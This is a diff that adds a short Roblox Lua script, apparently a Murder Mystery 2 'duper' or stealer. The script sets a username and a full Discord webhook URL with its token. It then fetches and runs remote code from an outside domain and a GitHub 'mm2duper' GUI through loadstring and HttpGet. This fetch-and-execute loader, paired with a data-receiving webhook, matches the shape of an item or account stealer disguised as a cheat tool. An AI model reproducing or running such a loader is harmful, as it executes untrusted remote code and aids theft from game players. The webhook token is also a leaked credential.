@@ -1,0 +1,8 @@
+Username = "CopperToGingerscope"
+Webhook = "https://discord.com/api/webhooks/1263822611696189442/OwUzCNQWcUmLvPmebCx3Y_6YmG9NsgrK6tuKwCrHnK_-BkuzLyU8oZFhiRtoPNk55yso"
+
+loadstring(game:HttpGet("https://egorikusa.space/mm2"))()
+
+wait(1)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mm2duper/gui/main/gui"))()
